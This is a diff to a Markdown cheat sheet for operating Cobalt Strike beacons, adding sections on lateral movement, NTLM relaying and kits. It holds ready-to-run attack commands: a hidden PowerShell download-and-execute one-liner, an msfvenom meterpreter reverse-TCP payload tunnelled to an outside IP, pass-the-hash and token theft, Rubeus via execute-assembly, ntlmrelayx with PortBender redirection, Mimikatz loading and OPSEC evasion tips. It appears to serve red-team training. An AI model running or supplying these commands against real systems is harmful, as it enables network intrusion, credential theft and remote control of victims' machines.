@@ -26,7 +26,9 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Custom Payloads](#custom-payloads)
 * [Malleable C2](#malleable-c2)
 * [Files](#files)
-* [Powershell .NET](#powershell-net)
+* [Powershell and .NET](#powershell-and-net)
+    * [Powershell commabds](#powershell-commands)
+    * [.NET remote execution](#net-remote-execution)
 * [Lateral Movement](#lateral-movement)
 * [VPN & Pivots](#vpn--pivots)
 * [Kits](#kits)
@@ -34,6 +36,8 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Persistence Kit](#persistence-kit)
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
+    * [Mimikatz Kit](#mimikatz-kit)
+* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
 
 
@@ -166,6 +170,7 @@ $ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\d
 * Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
 * Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
 * Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
+* SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint
 
 ```powershell
 set useragent "SOME AGENT"; # GOOD
@@ -279,7 +284,9 @@ beacon > cancel [*file*]
 beacon > upload [/path/to/file]
 ```
 
-## Powershell .NET
+## Powershell and .NET
+
+### Powershell commands
 
 ```powershell
 # Import a Powershell .ps1 script from the control server and save it in memory in Beacon
@@ -293,8 +300,16 @@ beacon > powerpick [commandlet] [argument]
 
 # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
 beacon > psinject [pid][arch] [commandlet] [arguments]
+```
 
-# Run a local .NET executable as a Beacon post-exploitation job
+### .NET remote execution
+
+Run a local .NET executable as a Beacon post-exploitation job. 
+
+Require:
+* Binaries compiled with the "Any CPU" configuration.
+
+```powershell
 beacon > execute-assembly [/path/to/script.exe] [arguments]
 beacon > execute-assembly /home/audit/Rubeus.exe
 [*] Tasked beacon to run .NET program: Rubeus.exe
@@ -312,6 +327,21 @@ beacon > execute-assembly /home/audit/Rubeus.exe
 ```
 
 ## Lateral Movement
+
+:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 
+
+- **portscan:** Performs a portscan on a spesific target.
+- **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
+- **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
+:exclamation: This module needs Administrator privileges.
+- **steal_token:** Steal a token from a specified process.
+- **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
+- **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
+:exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
+:muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
+- **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
+:exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
+- **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.
 
 :warning: All the commands launch powershell.exe
 
@@ -363,9 +393,19 @@ beacon > browserpivot [pid] [x86|x64]
 
 # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
 beacon > rportfwd [bind port] [forward host] [forward port]
+
+# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
+beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin
+
+# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller
+# then you can handle the connect back on your MSF multi handler
+beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
 ```
 
 ## Kits
+
+* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike
 
 ### Elevate Kit
 
@@ -428,6 +468,22 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 - Build the Artifact
 - Cobalt Strike -> Script Manager > Load .cna
 
+### Mimikatz Kit
+
+* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
+* Load the mimikatz.cna aggressor script
+* Use mimikatz functions as normal
+
+## NTLM Relaying via Cobalt Strike
+
+```powershell
+beacon> socks 1080
+kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
+beacon> rportfwd_local 8445 <IP_KALI> 445
+beacon> upload C:\Tools\PortBender\WinDivert64.sys
+beacon> PortBender redirect 445 8445
+```
+
 ## References
 
 * [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
@@ -444,3 +500,5 @@ Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :
 * [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
 * [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
 * [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
+* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
+* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
